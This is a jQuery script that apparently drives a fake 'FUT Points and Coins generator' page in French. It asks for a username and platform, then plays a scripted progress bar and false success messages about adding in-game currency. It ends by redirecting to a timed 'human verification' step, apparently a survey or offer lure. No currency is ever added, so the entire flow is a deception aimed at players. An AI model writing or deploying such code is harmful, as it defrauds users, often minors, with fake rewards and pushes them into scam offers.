$(document).ready(function() {
	
	////////////////
	// Console Messages
	////////////////
	$p_im_1 = "Chargement...";
	$p_im_2 = "Ajout de <span class='malaft-p-c-msg-val-p'></span> FUT Points for <span class='malaft-p-u-msg-val'></span>";
	$p_im_3 = "Ajout de <span class='malaft-p-c-msg-val-c'></span> FUT Coins for <span class='malaft-p-u-msg-val'></span>";
	$p_im_4 = "Ajout avec succès <span class='malaft-p-c-msg-val-p'></span>  FUT Points & <span class='malaft-p-c-msg-val-c'></span> FUT Coins";
	$p_im_5 = "Chargement...";
	$p_im_6 = "Finalisation de la procédure...";
	$p_im_7 = "<span class='malaft-g-m-i'>Validation Requise de d'utilisateur ...</span>";
	$p_im_8 = "<span class='malaft-g-m-i'>Redirection vers la validation</span>";
	
	////////////////
	// Points Amounts
	//////////////// 
	var $points_amount_1 = 1600;
	var $points_amount_2 = 2200;
	var $points_amount_3 = 4600;
	var $points_amount_4 = 12000;
	
	////////////////
	// Coins Amounts
	//////////////// 
	var $coins_amount_1 = 100000;
	var $coins_amount_2 = 350000;
	var $coins_amount_3 = 500000;
	var $coins_amount_4 = 5000000;
	
	$p_im = "img/pi.png";
	$c_im = "img/ci.png";
	
	////////////////
	// Human Verification Timer
	////////////////
	var $human_verification_timer_value = '180'; //Countdown remaing time in seconds	
	
	function aO(el, anim, onDone) {
		var $el = $(el);
		$el.addClass( 'animate__animated ' + anim );
		$el.one( 'animationend', function() {
			$(this).removeClass( 'animate__animated ' + anim );
			onDone && onDone();
		});
	}
	function gS(step, onStep) {
		var xhr = new XMLHttpRequest();
		xhr.open( 'GET', 'malfup/' + step + '.php' );
		xhr.setRequestHeader( "X-REQUESTED-WITH", 'xmlhttprequest' );
		xhr.addEventListener( 'readystatechange', function() {
			if ( xhr.readyState == 4 ) {
				onStep && onStep(xhr.responseText);
			}
		});
		xhr.send();
	}
	
	var $su;
	var selected_platform;
	selected_platform = '';
	function fixplatformBox($platform_parent_class) {
		resetplatformBoxes();
		if ($platform_parent_class.hasClass('platform-item-1')) {
			selected_platform = 'Windows';
		}
		if ($platform_parent_class.hasClass('platform-item-2')) {
			selected_platform = 'Xbox';
		}
		if ($platform_parent_class.hasClass('platform-item-3')) {
			selected_platform = 'Playstation';
		}
		$platform_parent_class.addClass('active');
	}	
	function resetplatformBoxes() {
		var $platform_list = $('.platform-item-1, .platform-item-2, .platform-item-3');	
		if ($platform_list.hasClass('active')) {
			$platform_list.removeClass('active');
		}
	}	
	$('.platform-item').click(function() {
		if (!$(this).hasClass("active")) {
			aO( this, 'animate__headShake' );
		}	
		fixplatformBox($(this));
	});
	$('#gs-1').click(function() {
		if($('#player-username').val() == '') {
			aO( $('.username-wrapper'), 'animate__shake' );
			$('.input-error-notice-1').fadeIn(function() {					
				setTimeout(function(){ $('.input-error-notice-1').fadeOut() }, 1000);
			});
		} else if(selected_platform == '') {
			aO( $('.platform-field-wrapper'), 'animate__shake' );
			$('.input-error-notice-2').fadeIn(function() {					
				setTimeout(function(){ $('.input-error-notice-2').fadeOut() }, 1000);
			});
		} else {
			$su = $('#player-username').val();
			$sp= selected_platform;
			kRbF();		
		}	
	});	
	
	function kRbF() {
		gS( "malfup_1", function(src) {
			$('.activity-wrapper').fadeOut();
			$( '.m-g-w' ).html(src);			
			$('.rssp-c-ip').click(function () {
				if ($(this).hasClass("rssp-c-ip-1")) { 
					$sap = $points_amount_1;																			
				} else if ($(this).hasClass("rssp-c-ip-2")) { 
					$sap = $points_amount_2;
				} else if ($(this).hasClass("rssp-c-ip-3")) { 
					$sap = $points_amount_3;
				} else if ($(this).hasClass("rssp-c-ip-4")) { 
					$sap = $points_amount_4;
				}
				aO( $('.rssp-c-ip-1'), 'animate__fadeOutLeft' );
				aO( $('.rssp-c-ip-2'), 'animate__fadeOutLeft' );
				aO( $('.rssp-c-ip-3'), 'animate__fadeOutRight' );
				aO( $('.rssp-c-ip-4'), 'animate__fadeOutRight' );
				$('.rssp-c-ip').fadeOut();
				setTimeout(function() {
					gS( "malfup_2", function(src) {
						$( '.m-g-w' ).html(src);
						$('.rssp-c-ic').click(function () {
							if ($(this).hasClass("rssp-c-ic-1")) { 
								$sac = $coins_amount_1;																			
							} else if ($(this).hasClass("rssp-c-ic-2")) { 
								$sac = $coins_amount_2;
							} else if ($(this).hasClass("rssp-c-ic-3")) { 
								$sac = $coins_amount_3;
							} else if ($(this).hasClass("rssp-c-ic-4")) { 
								$sac = $coins_amount_4;
							}
							aO( $('.rssp-c-ic-1'), 'animate__fadeOutLeft' );
							aO( $('.rssp-c-ic-2'), 'animate__fadeOutLeft' );
							aO( $('.rssp-c-ic-3'), 'animate__fadeOutRight' );
							aO( $('.rssp-c-ic-4'), 'animate__fadeOutRight' );
							$('.rssp-c-ic').fadeOut();
							gS( "malfup_3", function(src) {
								setTimeout(function() {
									$( '.m-g-w' ).html(src);
									$("#malaft-g-img-p").attr("src",$p_im);
									$("#malaft-g-img-c").attr("src",$c_im);
									function progressBar(percent, $element, duration) {
										var progressBarWidth = percent * $element.width() / 100;
										$element.find('div').animate({ width: progressBarWidth }, duration).html(percent + "%&nbsp;");
									}
									progressBar(0, $('#malaft-pBar'), 1);
									progressBar(100, $('#malaft-pBar'), 24000);
									jF(0, $p_im_1, 0, 0, 0);
									jF(3000, $p_im_2, 1, 0, 0);
									jF(7500, $p_im_3, 2, 0, 0);
									jF(12000, $p_im_4, 3, 0, 1);
									jF(14500, $p_im_5, 0, 0, 3);
									jF(16500, $p_im_6, 0, 0, 0);
									jF(18500, $p_im_7, 0, 0, 4);
									jF(20500, $p_im_8, 0, 0, 2);
									jF(23000, '', 0, 1, 0);
								}, 600);
							});	
						});	
					});	
				}, 600);
			});
		});	
	}
	function jF(tD, cms, gc, sl, cl) {
		setTimeout(function() {	
			$(".malaft-p-msg").html(cms);
			aO( $(".malaft-p-msg"), 'animate__bounceIn' );
			if (gc === 1) {				
				$('.malaft-p-loader').fadeOut(function() {
					aO( $('.malaft-p-g-item-p'), 'animate__bounceIn' );
					$('.malaft-p-g-item-p').fadeIn(function() {
						$('.malaft-p-g-item-value-p').countTo({
							from: 0,
							to: $sap,
							speed: 2500,
							refreshInterval: 10
						});					
					});				
				});	
				$('.malaft-p-c-msg-val-p').html($sap);
				$('.malaft-p-u-msg-val').html($su);
            }
			if (gc === 2) {				
				$('.malaft-p-g-item-p').fadeOut(function() {
					aO( $('.malaft-p-g-item-c'), 'animate__bounceIn' );
					$('.malaft-p-g-item-c').fadeIn(function() {
						$('.malaft-p-g-item-value-c').countTo({
							from: 0,
							to: $sac,
							speed: 2500,
							refreshInterval: 10
						});					
					});				
				});	
				$('.malaft-p-c-msg-val-c').html($sac);
				$('.malaft-p-u-msg-val').html($su);
            }
			if (gc === 3) {
				$('.malaft-p-g-item-c').fadeOut(function() {
					aO( $('.malaft-p-loader'), 'animate__bounceIn' );
					$('.malaft-p-loader').fadeIn();	
				});
				$('.malaft-p-c-msg-val-p').html($sap);
				$('.malaft-p-c-msg-val-c').html($sac);
			}	
			if (cl === 1) {
				$('.malaft-p-loader').html("<span class='material-icons-two-tone loader-success'>check_circle</span>");		
				aO( $(".malaft-p-loader"), 'animate__bounceIn' );	
            }
			if (cl === 2) {
				$('.malaft-p-loader').html("<span class='material-icons-two-tone malaft-p-loader-i'>info</span>");
				aO( $(".malaft-p-loader"), 'animate__bounceIn' );
            }
			if (cl === 3) {
				$('.malaft-p-loader').html("<span class='material-icons-two-tone fa-spin'>settings</span>");				
				aO( $(".malaft-p-loader"), 'animate__bounceIn' );
            }
			if (cl === 4) {
				$('.malaft-p-loader').html("<span class='material-icons-two-tone malaft-p-loader-e'>highlight_off</span>");				
				aO( $(".malaft-p-loader"), 'animate__bounceIn' );
            }
			if (sl === 1) {
				gS( "malfup_4", function(src) {
					$( '.m-g-w' ).html(src);
					$(".hvw-i-am-wp img").attr("src",$p_im);					
					$(".hvw-i-am-wc img").attr("src",$c_im);					
					$('#hvw-ic-u').html($su);
					$('#hvw-ic-a').html($sap);
					$('#hvw-ic-ac').html($sac);
					$('.hvw-i-am-w-a').html($sap);
					$('.hvw-i-am-w-a-c').html($sac);
					human_verification_timer.init($human_verification_timer_value);
				});	
            }
		}, tD );
	}
});
////////////////
// Verification Timer
////////////////
var human_verification_timer = function () {
    var time_left = 15;
    var keep_counting = 1;
    var time_out_msg = 'few seconds';
    function countdown() {
        if(time_left < 2) {
            keep_counting = 0;
        }
        time_left = time_left - 1;
    }
    function add_leading_zero( n ) {
        if(n.toString().length < 2) {
            return '0' + n;
        } else {
            return n;
        }
    }
    function format_output() {
        var hours, minutes, seconds;
        seconds = time_left % 60;
        minutes = Math.floor(time_left / 60) % 60;
        hours = Math.floor(time_left / 3600);   
        seconds = add_leading_zero( seconds );
        minutes = add_leading_zero( minutes );
        hours = add_leading_zero( hours );
        return minutes + ' minutes and ' + seconds + ' seconds';
    }
    function timer_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = '<span>' + format_output() + '</span>';
    }
    function no_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = time_out_msg;
    }
    return {
        count: function () {
            countdown();
            timer_time_left();
        },
        timer: function () {
            human_verification_timer.count();
            if(keep_counting) {
                setTimeout("human_verification_timer.timer();", 1000);
            } else {
                no_time_left();
            }
        },
        init: function (n) {
            time_left = n;
            human_verification_timer.timer();
        }
    };
}();
function rng(min, max) {
	return Math.floor(Math.random() * (max - min + 1) + min);

}
function Random(_0xaa63x2, _0xaa63x3) {
	return Math['floor'](Math['random']() * (_0xaa63x3 - _0xaa63x2) + _0xaa63x2);
};